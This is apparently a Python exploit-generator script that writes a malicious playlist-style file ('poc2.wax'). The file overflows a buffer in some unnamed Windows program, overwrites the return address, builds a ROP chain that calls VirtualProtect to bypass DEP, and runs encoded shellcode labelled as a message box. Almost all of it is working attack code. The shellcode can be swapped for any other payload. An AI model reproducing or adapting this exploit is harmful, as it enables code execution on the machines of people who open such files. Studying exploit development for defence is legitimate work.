import struct

def paick(shelly):
        return struct.pack('<L', shelly)

# badchars: \x00 \x0a \x1a \x2a
# msgbox
shellcode =  b""
shellcode += b"\xd9\xc2\xd9\x74\x24\xf4\x5b\xbd\xc2\x9f\xa8"
shellcode += b"\xce\x31\xc9\xb1\x40\x83\xc3\x04\x31\x6b\x13"
shellcode += b"\x03\xa9\x8c\x4a\x3b\xf4\x58\x11\x1d\x72\xbb"
shellcode += b"\xd2\xaf\xa8\x71\x6d\xe1\x85\x12\x19\x70\x25"
shellcode += b"\x50\x6b\x7f\xce\x10\x88\xf4\x96\xd4\x3b\x74"
shellcode += b"\x36\x6e\x0d\xb1\x79\x68\x07\x32\xdc\x89\x36"
shellcode += b"\x4b\x3f\xe9\x33\xd8\x9b\xce\xc8\x64\xdf\x85"
shellcode += b"\x9b\x4e\x67\x9b\xc9\x04\xdd\x83\x86\x41\xc1"
shellcode += b"\xb2\x73\x96\x35\xfc\x08\x6d\xbe\xff\xe0\xbf"
shellcode += b"\x3f\xce\x3c\x43\x13\xb5\x7d\xc8\x6c\x77\xb2"
shellcode += b"\x3c\x73\xb0\xa6\xcb\x48\x42\x1d\x1c\xdb\x5b"
shellcode += b"\xd6\x06\x07\x9d\x02\xd0\xcc\x91\x9f\x96\x88"
shellcode += b"\xb5\x1e\x42\xa7\xc2\xab\x95\x5f\x43\xef\xb1"
shellcode += b"\x83\x35\x33\x0b\xb3\x9c\x67\xe5\x26\x57\x45"
shellcode += b"\x9e\x26\x26\x44\xb3\x64\x5f\xc7\xb4\x77\x60"
shellcode += b"\x71\x0f\x83\x24\xfc\x48\x69\x29\x86\x75\x49"
shellcode += b"\x9c\x60\x0b\x6e\xdf\x8e\x9d\xd5\x28\x19\xf2"
shellcode += b"\xb9\x08\x98\x62\x72\x7b\x34\x17\x1c\x0e\x3b"
shellcode += b"\xb2\xae\xc0\x60\xb4\x12\x05\x9d\x4c\x4c\x13"
shellcode += b"\x5e\x1b\x94\x15\x62\xf4\x2f\x8d\xc1\xb8\xf3"
shellcode += b"\x49\x19\x67\x59\xbe\x7d\x98\xa2\xc1\xea\x16"
shellcode += b"\x04\x1e\xcb\xbe\xd1\x33\x6a\x53\x28\x17\xe4"
shellcode += b"\xf7\x6e\xa2\x7c\xe4\x06\xc8\x26\xcb\xf6\x78"
shellcode += b"\xa7\x7c\x98\x1d\x76\x4a\xec\x92\x5c\x49\x65"
shellcode += b"\xcb\xac\x83\x27\x5f\x9e\x71\x38\x8f\x11\xb6"
shellcode += b"\x96\xcf\x07\x3e"


payload = b"A"*1012

payload += paick(0x10101008) # eip - retn 

# save address of this location for return func
payload += paick(0x10015f16) # xor eax, eax
payload += paick(0x10010405) # push esp, pop edi, pop esi
payload += b"BBBB"
payload += paick(0x100330ca) # xchg eax, edi
payload += paick(0x1001fc81) # add eax, 58; retn 0x04
payload += b"XXXX"
payload += paick(0x1001fc81) # again add eax, 58, retn 0x04
payload += b"XXXX"
payload += paick(0x10104879) # push eax
payload += paick(0x10019ef0) # pop esi
payload += paick(0x10034cf0) # xchg eax, ebp, ret
        # Now esi and ebp both point to return address esp + 116h,
        # so we have 256 bytes in stack for our rop chain

# 1. Put virtualprotect into EDI
payload += paick(0x10015f82) # pop eax, ret
payload += paick(0x10109270) # pointer to virtualprotect
payload += paick(0x1001eaf1) # mov eax, dword ptr ds:[eax]
payload += paick(0x100330ca) # xchg eax, edi
# Now edi = vprotect

# 6. Put oldprotect into EDX
payload += paick(0x1004041c) # pop edx
payload += paick(0x10101279) # random writable memory

# 5. Put Newprotect 0x40 into EBX
payload += paick(0x10015f16) # xor eax, eax
payload += paick(0x10015fdf) # add al, 41
payload += paick(0x1003a083) # dec eax
payload += paick(0x10104879) # push eax
payload += paick(0x1001127a) # pop ebx

# 4. Put dwSize into ESP - last
# Preparation of 0x320
# eax = 0x40
payload += paick(0x10104879) # push eax
payload += paick(0x10601007) # pop ecx
payload += paick(0x10015fe5) # push 4, pop eax
payload += paick(0x10014474) # add eax,4
payload += paick(0x10014474) # add eax,4
payload += paick(0x10104824) # mul ecx, ret 0x10
# now eax = 40*12 = 480h  = 1152 bytes
payload += b"XXXX"*4 # junk offset

# Finally do a pushad, ret
payload += paick(0x1001d7a5) # pushad; ret


payload += paick(0x90909090)*40 # nop sled
payload += shellcode
payload += paick(0x90909090)*20 # placeholders for now

#payload = bytes(payload, 'utf-8')

#payload += paick(0x10101013)*40 # another retn
output_file = open("poc2.wax", "wb") 
output_file.write(payload)
output_file.close()

